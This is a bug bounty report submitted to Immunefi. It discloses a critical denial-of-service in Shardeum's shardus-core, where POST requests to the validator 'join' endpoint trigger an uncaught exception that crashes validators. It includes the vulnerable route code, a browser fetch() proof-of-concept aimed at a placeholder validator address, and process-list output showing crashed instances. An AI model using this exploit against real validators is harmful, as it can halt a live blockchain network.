# 32993 - \[BC - Critical] Crashing Validators by triggering an uncaught e...

Submitted on Jul 9th 2024 at 13:00:31 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #32993

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

This report will describe how sending a maliciously crafted HTTP POST request to the vulnerable "join" endpoint crashes the validator due to an uncaught exception.

The most basic impact will be a total network shutdown by crashing all validators, rated as "Critical" in the **Impacts in Scope** table.

With more time to play with the codebase, we could try to control the entire consensus by shutting down all validators in Standby except ours, but "total network shutdown" is already at the highest severity level so we think is best to invest time doing more research in the codebase and providing as much value as possible to your team than escalating an attack vector that is already catastrophic for the network.

## Vulnerability Details

Below is the vulnerable function, as a reference:

```
const joinRoute: P2P.P2PTypes.Route<Handler> = {
  method: 'POST',
  name: 'join',
  handler: async (req, res) => {
    const joinRequest: JoinRequest = Utils.safeJsonParse(Utils.safeStringify(req.body))

    // ... more code below
   
```

> Snippet of code from: <https://github.com/shardeum/shardus-core/blob/dev/src/p2p/Join/routes.ts#L65-L209>

The endpoint accepts an HTTP POST request with a JSON object in the body that is parsed as a string, then converted to a JSON object, and assigned to a constant `joinRequest` of type **JoinRequest**.

Because the core logic of the *join* handler is not inside a `try-catch` block, when the body of the HTTP POST request is empty, the function crashes and the validator goes down under the status "**errored**.

> The status of each instance can be verified by running the command: `shardus list-net` or `shardus pm2 list`

## Observations in our tests

In our tests, we started 20 validators in a network with a configuration that requires/"desires" only 10 validators, to have some backups on standby, waiting to join.

After waiting a few minutes so they all sync, the column **Desired** of the monitor server at port **:3000** shows the value of `10`, as expected.

After crashing several validator instances by exploiting the attack described in this report, waiting a few minutes and crashing more validators, the column **Desired** goes from `10` to `0`, and the network shuts down itself.

## Impact Details

Ability to crash all validators, leading to the network not being able to confirm new transactions

## Proof of Concept

This is a very easy-to-reproduce proof of concept, we created a short javascript snippet that you can run even in your browser console, to exploit a victim validator.

```
fetch("http://VALIDATOR_EXTERNAL_IP:VALIDATOR_EXTERNAL_PORT/join/", options).then(response => { if (!response.ok) { throw new Error('Network response was not ok');}return response.json();}).then(data => {console.log('Success:', data);}).catch(error => {console.error('Error:', error);});
```

Replace VALIDATOR\_EXTERNAL\_IP and VALIDATOR\_EXTERNAL\_PORT with the IP and Port of the target.

After running the query with as many validators as desired, run the command `shardus pm2 list` to check their status.

They will displayed as **errored**.

If any of them is not, wait a few minutes and run it again.

Here's the output on our end:

```
┌─────┬────────────────────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name                       │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────────────────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 1   │ "archive-server-1"         │ default     │ 3.4.21  │ fork    │ 1072795  │ 63m    │ 0    │ online    │ 0%       │ 90.5mb   │ z        │ disabled │
│ 2   │ "monitor-server"           │ default     │ 2.6.3   │ fork    │ 1072833  │ 63m    │ 0    │ online    │ 0%       │ 152.8mb  │ z        │ disabled │
│ 3   │ "shardus-instance-9001"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 4   │ "shardus-instance-9002"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 5   │ "shardus-instance-9003"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 6   │ "shardus-instance-9004"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 7   │ "shardus-instance-9005"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 8   │ "shardus-instance-9006"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 9   │ "shardus-instance-9007"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 10  │ "shardus-instance-9008"    │ default     │ 1.11.4  │ fork    │ 1073149  │ 63m    │ 0    │ online    │ 0%       │ 165.3mb  │ z        │ disabled │
│ 11  │ "shardus-instance-9009"    │ default     │ 1.11.4  │ fork    │ 1073210  │ 63m    │ 0    │ online    │ 0%       │ 165.9mb  │ z        │ disabled │
│ 12  │ "shardus-instance-9010"    │ default     │ 1.11.4  │ fork    │ 1073260  │ 63m    │ 0    │ online    │ 0%       │ 166.5mb  │ z        │ disabled │
│ 13  │ "shardus-instance-9011"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 14  │ "shardus-instance-9012"    │ default     │ 1.11.4  │ fork    │ 1073367  │ 63m    │ 0    │ online    │ 100%     │ 166.9mb  │ z        │ disabled │
│ 15  │ "shardus-instance-9013"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 16  │ "shardus-instance-9014"    │ default     │ 1.11.4  │ fork    │ 1078370  │ 40m    │ 1    │ online    │ 0%       │ 141.8mb  │ z        │ disabled │
│ 17  │ "shardus-instance-9015"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 18  │ "shardus-instance-9016"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 19  │ "shardus-instance-9017"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 20  │ "shardus-instance-9018"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 21  │ "shardus-instance-9019"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ z        │ disabled │
│ 22  │ "shardus-instance-9020"    │ default     │ 1.11.4  │ fork    │ 1079219  │ 38m    │ 1    │ online    │ 0%       │ 140.5mb  │ z        │ disabled │
└─────┴────────────────────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
```
